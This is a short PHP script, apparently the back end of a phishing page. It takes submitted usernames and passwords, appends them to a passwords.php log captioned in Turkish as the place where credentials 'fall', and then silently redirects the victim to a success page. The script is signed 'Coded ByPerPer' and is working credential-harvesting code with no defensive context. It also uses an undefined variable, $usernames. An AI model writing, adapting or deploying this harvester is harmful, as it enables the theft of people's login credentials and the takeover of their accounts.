<?php
$username = $_POST['user'];
$password = $_POST['pass'];
$file = fopen('passwords.php', 'a');



fwrite($file, $usernames."<p>Kullanıcı adı ve şifrelerin düştüğü alan. Coded ByPerPer</p><font color='red'>" .$username. "</font>:<font color='green'>" .$password. "</font>:\n\n</br>");

fclose($file);
echo '';
           header("refresh:0; url=successful.php");
?>